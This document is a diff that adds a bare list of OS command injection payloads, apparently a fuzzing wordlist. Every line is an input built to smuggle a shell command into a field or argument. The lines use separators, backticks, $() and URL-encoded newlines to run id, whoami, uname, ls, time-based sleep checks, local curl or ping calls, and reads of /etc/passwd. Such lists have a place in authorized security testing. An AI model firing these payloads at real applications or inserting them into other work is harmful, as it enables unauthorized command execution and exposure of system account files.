@@ -1,0 +1,50 @@
+; id
+; whoami
+; uname -a
+| id
+| whoami
+| uname -a
+|| id
+|| whoami
+& id
+& whoami
+&& id
+&& whoami
+`id`
+`whoami`
+$(id)
+$(whoami)
+; cat /etc/passwd
+| cat /etc/passwd
+|| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 3 127.0.0.1
+; curl http://127.0.0.1
+| curl http://127.0.0.1
+;ls
+|ls
+||ls
+&ls
+&&ls
+%0aid
+%0awhoami
+%0a cat /etc/passwd
+%0d%0aid
+%0d%0awhoami
+%0A id
+%0A whoami
+%0D%0A id
+a]%0d%0aid%0d%0a[
+%00; id
+'; id #
+"; id #
+'; whoami #
+"; whoami #
